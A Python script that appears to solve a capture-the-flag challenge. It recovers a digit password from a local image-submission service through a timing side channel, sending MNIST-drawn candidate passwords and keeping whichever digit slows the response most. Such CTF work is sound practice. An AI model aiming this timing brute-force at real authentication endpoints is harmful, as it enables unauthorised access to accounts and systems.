#!/usr/bin/env python3

import numpy as np
import requests
from PIL import Image, ImageDraw
from sklearn.datasets import fetch_mldata
from sklearn.utils import shuffle


TMP_IMAGE_PATH = '/tmp/image.png'

DIGIT_COUNT = 50
TRIES = 3


def get_digits():
    mnist = fetch_mldata('MNIST original')
    X = shuffle(mnist.data, random_state=42)

    digits = []
    for i in range(DIGIT_COUNT):
        img = Image.new('L', (28, 28), 'black')
        pixels = img.load()
        data = X[i].reshape(img.height, img.width)
        for r in range(img.height):
            for c in range(img.width):
                pixels[c, r] = (data[r, c],)

        digits.append(img)
    return digits


def send_password(password, digits, square):
    img = Image.new('RGBA', (1000, 500), (0, 0, 0, 255))

    if square:
        draw = ImageDraw.Draw(img)
        draw.rectangle((28 * 2 * 10, 0, img.width, img.height), fill='white')

    for i, item in enumerate(password):
        img.paste(digits[item].resize((28 * 2, 28 * 2)), (i * 28 * 2, 0))
    img.save(TMP_IMAGE_PATH)

    with open(TMP_IMAGE_PATH, 'rb') as img_file:
        r = requests.post('http://localhost:5000/api/submit_image',
                          files={'image': img_file})
        response = r.json()
        if 'QCTF' in response['status']:
            print('SUCCESS', password, response['status'])
        elapsed_ms = response['elapsed_ms']

    print('{} -> {} ms'.format(password, elapsed_ms))
    return elapsed_ms


def main():
    digits = get_digits()

    password = []
    for _ in range(10):
        elapsed = [[] for _ in range(DIGIT_COUNT)]
        for _ in range(TRIES):
            for digit in range(DIGIT_COUNT):
                cur_elapsed = send_password(password + [digit], digits, True)
                elapsed[digit].append(cur_elapsed)
        elapsed = [np.mean(ts) for ts in elapsed]

        _, digit = max((value, i) for i, value in enumerate(elapsed))
        password += [digit]

    print('Result:', password)
    send_password(password, digits, False)


if __name__ == '__main__':
    main()
